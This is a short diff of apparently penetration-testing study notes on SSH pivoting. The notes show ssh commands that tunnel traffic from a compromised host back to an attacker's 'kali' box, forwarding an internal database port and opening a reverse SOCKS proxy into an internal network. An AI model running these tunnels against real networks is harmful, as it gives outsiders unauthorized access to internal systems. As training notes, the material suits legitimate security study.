@@ -24,10 +24,10 @@ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
 
 ```bash
 # Connect to our attack box, listen on port 2345, and forward all traffic to 10.4.50.215:5432
-ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@$OUR_IP
 
-# Connect to our attack box, and act as a SOCKS proxy operating on port 9998
-ssh -N -R 9998 kali@192.168.118.4
+# Connect to our attack box, and act as a SOCKS proxy operating on port 1080
+ssh -N -R 1080 kali@$OUR_IP
 ```
 
 `-N` means no shell
